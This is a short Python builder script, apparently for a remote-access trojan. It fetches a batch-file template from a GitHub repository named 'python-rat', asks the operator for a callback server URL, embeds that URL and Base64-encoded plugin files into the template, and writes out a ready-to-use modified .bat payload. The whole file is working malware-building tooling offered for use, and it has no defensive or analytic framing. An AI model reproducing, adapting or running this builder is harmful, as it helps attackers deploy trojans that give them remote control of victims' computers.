import os
import requests
import base64

# Step 1: Create the './plugin' directory if it doesn't exist
plugin_dir = './plugin'
if not os.path.exists(plugin_dir):
    os.makedirs(plugin_dir)
    print(f"Created directory: {plugin_dir}")

# Step 2: Fetch content from the given URL
url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/scr/main.bat"
response = requests.get(url)
if response.status_code == 200:
    main_bat_content = response.text
    print("Fetched content from URL successfully.")
else:
    print(f"Failed to fetch content from URL. Status code: {response.status_code}")
    exit()

# Step 3: Get the server URL from user input
server_url = input("YOU URL SERVER: ")

# Replace 'YOUR_URL_HERE_SERVER' with the user-provided server URL
main_bat_content = main_bat_content.replace("YOUR_URL_HERE_SERVER", server_url)

# Step 4: Concatenate all content from files in './plugin' and Base64-encode it
plugin_content = ""

# Iterate through all files in the './plugin' directory
for filename in os.listdir(plugin_dir):
    filepath = os.path.join(plugin_dir, filename)
    if os.path.isfile(filepath):
        with open(filepath, 'r', encoding='utf-8') as file:
            plugin_content += file.read() + '\n\n\n'  # Add triple newlines between files

# Base64-encode the concatenated content
encoded_plugin_content = base64.b64encode(plugin_content.encode('utf-8')).decode('utf-8')

# Replace '<plugin>' in the main.bat content with the encoded plugin content
main_bat_content = main_bat_content.replace("<plugin>", encoded_plugin_content)

# Step 5: Save the modified content to a new .bat file
output_file_path = './modified_main.bat'
with open(output_file_path, 'w', encoding='utf-8') as file:
    file.write(main_bat_content)

print(f"Modified content saved to {output_file_path}.")
